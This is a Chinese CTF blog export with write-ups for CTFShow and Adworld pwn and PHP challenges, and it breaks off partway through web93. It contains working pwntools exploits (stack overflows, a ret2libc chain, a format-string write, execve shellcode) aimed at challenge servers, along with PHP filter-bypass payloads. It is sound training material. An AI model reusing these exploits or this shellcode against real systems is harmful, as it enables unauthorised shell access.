<h1 id="ctfhsow-pwn06"><a href="#ctfhsow-pwn06" class="headerlink" title="ctfhsow-pwn06"></a>ctfhsow-pwn06</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">b&#x27;pwn.challenge.ctf.show&#x27;</span>, <span class="number">28086</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">system = <span class="number">0x40057B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)</span><br><span class="line">payload += p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="ctfhsow-pwn07"><a href="#ctfhsow-pwn07" class="headerlink" title="ctfhsow-pwn07"></a>ctfhsow-pwn07</h1><h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Jqtie_4qsh.png"></p>
<p>明显栈溢出，思路与之前一样先得到libc版本，推算出<code>system</code>和<code>/bin/sh</code>的地址</p>
<p>此时要注意64位要返回地址是<code>pop rdi；red</code> ,因为64位程序要考虑堆栈平衡。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_1YTsZe1U1l.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_aU7GzL5gr5.png"></p>
<h2 id="得到libc"><a href="#得到libc" class="headerlink" title="得到libc"></a>得到libc</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span></span><br><span class="line">pop_ret = <span class="number">0x4004c6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xC</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>

<p>根据打印出来的结果的后三位</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_GPmg3pBLU1.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_m6LChvaAOJ.png"></p>
<p>由此得到后半部分</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">libc_base = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&quot;pwn.challenge.ctf.show&quot;</span>, <span class="number">28195</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;pwn7&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x4006e3</span></span><br><span class="line">pop_ret = <span class="number">0x4004c6</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xC</span> + <span class="number">8</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(main)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvline()</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - <span class="number">0x0809c0</span></span><br><span class="line">system = libc_base + <span class="number">0x04f440</span></span><br><span class="line">bin_sh = libc_base + <span class="number">0x1b3e9a</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xc</span>+<span class="number">8</span>)+p64(pop_ret)+p64(pop_rdi)+p64(bin_sh)+p64(system)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PHTPHtqql_.png"></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界部分PWN题</title>
    <url>/PWN/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E2%80%94PWN%E9%83%A8%E5%88%86/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>随手玩了下，就随手写个WP。</p>
<span id="more"></span>

<h1 id="攻防世界—cgpwn2"><a href="#攻防世界—cgpwn2" class="headerlink" title="攻防世界—cgpwn2"></a>攻防世界—cgpwn2</h1><p>对附件做一个分析</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_lRKaqFqqJr.png"></p>
<p>32位程序</p>
<h2 id="防护机制"><a href="#防护机制" class="headerlink" title="防护机制"></a>防护机制</h2><h3 id="ASLR-Address-space-layout-randomization，地址空间布局随机化"><a href="#ASLR-Address-space-layout-randomization，地址空间布局随机化" class="headerlink" title="ASLR (Address space layout randomization，地址空间布局随机化)"></a>ASLR (Address space layout randomization，地址空间布局随机化)</h3><p>在windows上ASLR主要包括<code>堆栈随机化</code>、<code>PEB</code>（Process Envirorment Block Structure进程环境信息块）与<code>TEB</code>（线程环境快）、<code>映像随机化</code>,windows系统从vista开始ASLR才真正发挥作用。 &amp;#x20;</p>
<p>在linux上ASLR主要包括<code>栈地址随机化</code>、<code>LIBS/MMAP随机化、EXEC随机化、BRK随机化、VDSO随机化</code>。在没有ASLR的情况下让程序跳转到一个已经存在的系统函数的漏洞利用方式被称为<code>ret2libc</code>。 &amp;#x20;</p>
<p>在linux系统中<code>ASLR被分为0，1，2三个等级</code>，可以通过<code>sudo bash -c &quot;echo 2 &gt; /proc/sys/kernel/randomize_va_space&quot;设置</code>。 &amp;#x20;<br>0：没有随机化。即关闭ASLR。 &amp;#x20;<br>1：保留的随机化。共享库、栈、mmap()分配的内存空间以及VDSO将被随机化。 &amp;#x20;<br>2：完全的随机化。在1的基础上，通过 brk()分配的内存空间也将被随机化。</p>
<h3 id="NX-Non-Executable-Memory，不可执行内存"><a href="#NX-Non-Executable-Memory，不可执行内存" class="headerlink" title="NX(Non-Executable Memory，不可执行内存)"></a>NX(Non-Executable Memory，不可执行内存)</h3><p>类似于DEP，数据执行保护。</p>
<h3 id="PIE"><a href="#PIE" class="headerlink" title="PIE"></a>PIE</h3><p>PIE只有在系统开启ASLR和编译时开启-fpie-pie选项这两个条件同时满足时才会生效。</p>
<h3 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h3><p>RELRO(RELocation Read-Only，只读重定位)让加载器将重定位表中加载时解析的符号标记为只读，这减少了GOT覆写攻击的面积。RELRO可以分为Partial RELRO(部分RELRO)和Full RELRO(完整RELRO)。开启Partial RELRO的话GOT表是可写的；开启FULL RELRO的话GOT表是只读的。</p>
<h3 id="Stack"><a href="#Stack" class="headerlink" title="Stack"></a>Stack</h3><p>Stack Protector又名canary，stack cookie……等等，类似于VS编译器中的GS。</p>
<h2 id="用32位IDA打开附件"><a href="#用32位IDA打开附件" class="headerlink" title="用32位IDA打开附件"></a>用32位IDA打开附件</h2><p>pwn函数中的system无法利用。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PgBpWYFlvO.png"></p>
<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>shift+f12查找字符串并没有发现&#x2F;bin&#x2F;sh，可能需要自己整，或者藏在某个变量里。</p>
<p>在函数列表里找到了真正的_system，括号内的command似乎是输入，这里插留坑。地址是<code>0x804A0C8</code></p>
<p>要自己构建执行命令，有个条件：</p>
<p>要求执行的命令在一个固定的地址上，且可以读取写入。</p>
<p>题中第一个输入的变量存在name中，<strong>而name标蓝代表全局变量</strong>。</p>
<ul>
<li><p>name再<code>.bss</code>段上，还未初始化，但地址也是固定的</p>
</li>
<li><p>name前可以看到这一部分的.bss段<code>具有可读写属性</code></p>
</li>
</ul>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_jssWUMAemO.png"></p>
<p>由此构建EXP</p>
<p>利用第一个输入，写我们想要执行的命令，eg： &#x2F;bin&#x2F;sh</p>
<p>利用第二个输入的gets进行栈溢出，拼接出 system &#x2F;bin&#x2F;sh：</p>
<ul>
<li><p>先将字符串s填满在把s的栈地址填满，将返回地址改成system地址</p>
</li>
<li><p>再填四字节无用地址堵住system的返回地址，至于为什么要用四，是因为他的长度为四</p>
</li>
<li><p>然后缝合上之前输入的&#x2F;bin&#x2F;sh的地址</p>
</li>
</ul>
<p>python3中需要把所有都转化为字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">63983</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn006&quot;)</span></span><br><span class="line">binsh = <span class="string">b&quot;/bin/sh&quot;</span></span><br><span class="line">system = <span class="number">0x8048420</span></span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804A080</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">0x26</span> + <span class="string">b&quot;B&quot;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(name)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;please tell me your name&quot;</span>,binsh)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;hello,you can leave some message here:&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PKhu5FLnGF.png"></p>
<p>如果用<code>/bin/sh</code> 要在Linux下，因为对方主机是Linux的</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_uKsv24Nb9b.png"></p>
<h1 id="攻防世界—level0"><a href="#攻防世界—level0" class="headerlink" title="攻防世界—level0"></a>攻防世界—level0</h1><p>先下载附件分析一下。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_k_BI6Ta-qA.png"></p>
<p>64位程序，未开启Stack典型的栈溢出了。</p>
<p><code>shift+f12</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_xd-8KGQXy8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_OglOior0aR.png"></p>
<p>在按x寻找入口函数。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_tjf9P5rDTW.png"></p>
<p>开始地址是<code>400596</code></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_gvJAShSN9w.png"></p>
<p><code>vulnerable_function()</code> 函数中的buf只有80位。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_CbfulmGFKj.png"></p>
<p>却可以输入200位。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_PTOhSaIC9b.png"></p>
<p>存在栈溢出。返回地址r是8字节。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_4BKYFn7R5a.png"></p>
<p>由此构造payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">57658</span>)</span><br><span class="line"></span><br><span class="line">callsystem = <span class="number">0x400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x80</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span> + p64(callsystem)</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;Hello, World\n&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_WRfJIt7opO.png"></p>
<h1 id="攻防世界—leve2"><a href="#攻防世界—leve2" class="headerlink" title="攻防世界—leve2"></a>攻防世界—leve2</h1><p>流程和上一题没差多少，所以直接给EXP了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>,<span class="number">62163</span>)</span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line">bin_s = <span class="number">0x0804A024</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">0x88</span> + <span class="string">b&#x27;B&#x27;</span>*<span class="number">0x4</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_s)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;Input:&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="攻防世界-string"><a href="#攻防世界-string" class="headerlink" title="攻防世界-string"></a>攻防世界-string</h1><p>老规矩，先分析一下文件</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_wx8iYZ7bh3.png"></p>
<p>分析了很多次就不多说了。</p>
<p>然后用64位IDA打开，从题目名字可猜测，是一道格式化字符串漏洞的题，所以等下<code>print()</code>着重看一下。</p>
<p>可以在Linux中先将程序跑一遍，对程序的流程和分支有个大概了解。本题是个简单的<code>D&amp;D类型题目</code>。</p>
<p>用IDA对程序进行分析，顺着程序的流程走，可以看到在<code>sub_400BB9</code>中有<code>printf(&amp;format, &amp;format)</code>语句，存在格式化字符串漏洞。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QRWZ87gqzD.png"></p>
<p>此外，在函数<code>sub_400CA6</code>中，可以发现<code>_QWORD</code>的分支有命令执行的语句，可以直接执行外部输入的命令。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Bn83Rw2Nf3.png"></p>
<p>因此，本题的关键在于，如何利用格式化字符串漏洞，让程序的控制流进入到命令执行语句；也就是说，进入<code>sub_400CA6</code>函数中，且满足<code>*a == a1[1]</code>的条件。</p>
<p>IDA进行具体分析：</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_m1EVc4Vam2.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_tuBTSmuzG_.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_V1WBvV-tGS.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_239oeQ1_yV.png"></p>
<p>使用Pwngdb在<code>printf(&amp;format, &amp;format)</code> 处设置断点，输入<code>0x052345</code>，在栈顶的第二个8字节，根据64位程序的传参方式，该地址是格式化字符串的第 7 个参数，<code>printf()</code> 函数的第 8 个参数。</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_svTqth0fmx.png"></p>
<p>由此可以得到EXP</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(arch = &#x27;amd64&#x27;)</span></span><br><span class="line"><span class="comment"># context(log_level = &#x27;debug&#x27;)</span></span><br><span class="line"><span class="comment"># context(terminal = [&#x27;deepin-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sh = process(&#x27;./string&#x27;)</span></span><br><span class="line">sh = remote(<span class="string">b&#x27;111.200.241.244&#x27;</span>, <span class="number">58455</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;secret[0] is &#x27;</span>)</span><br><span class="line">v3_addr = sh.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">v3_addr = <span class="built_in">int</span>(<span class="string">b&#x27;0x&#x27;</span> + v3_addr, <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(v3_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;name be:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;aaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;east or up?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;east&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;leave(0)?:\n&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;\&#x27;Give me an address\&#x27;&#x27;</span>)</span><br><span class="line">sh.sendline(<span class="built_in">str</span>(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;you wish is:\n&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%85c%7$hhn&#x27;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;I will help you! USE YOU SPELL&#x27;</span>)</span><br><span class="line">sh.recv()</span><br><span class="line">payload = <span class="string">b&#x27;\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05&#x27;</span></span><br><span class="line">sh.send(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_sV8DjeRxJ4.png"></p>
]]></content>
      <categories>
        <category>PWN</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFShow-PHP特性</title>
    <url>/WP/CTFShow-PHP%E7%89%B9%E6%80%A7/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>新姿势，记录记录。</p>
<span id="more"></span>


<h1 id="WEB89"><a href="#WEB89" class="headerlink" title="WEB89"></a>WEB89</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>由于<code>intval(array(&#39;&#39;))==1</code>，故直接数组绕过</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num[]=<span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>说明</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">函数：<span class="keyword">int</span> <span class="title function_ invoke__">intval</span> ( <span class="keyword">mixed</span> <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br><span class="line">说明：base=<span class="number">0</span>时，</span><br><span class="line">通过检测 <span class="keyword">var</span> 的格式来决定使用的进制：</span><br><span class="line">如果字符串包括了 <span class="string">&quot;0x&quot;</span> (或 <span class="string">&quot;0X&quot;</span>) 的前缀，使用 <span class="number">16</span> 进制 (hex)；</span><br><span class="line">如果字符串以 <span class="string">&quot;0&quot;</span> 开始，使用 <span class="number">8</span> 进制(octal)；</span><br><span class="line">否则，将使用 <span class="number">10</span> 进制 (decimal)。</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num= <span class="number">4476</span> <span class="comment"># 空格</span></span><br><span class="line">?num=<span class="number">0x117c</span> <span class="comment"># 十六进制</span></span><br><span class="line">?num=<span class="number">010574</span> <span class="comment"># 八进制</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/im&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^php$/i&#x27;</span>, <span class="variable">$a</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hacker&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;nonononono&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><code>/i</code>匹配大小写，<code>/m</code>匹配多行数据。<code>/^php$/m</code>这种形式能用<code>%0a</code>绕过。</p>
<p>Payload：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?cmd=%<span class="number">0</span>aphp</span><br><span class="line"></span><br><span class="line"><span class="comment">#还有一种方式，但是不太理解</span></span><br><span class="line">?cmd=php%<span class="number">0</span>a%<span class="number">0</span>a</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>Payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?num=<span class="number">0x117c</span></span><br><span class="line">?num=<span class="number">010574</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span 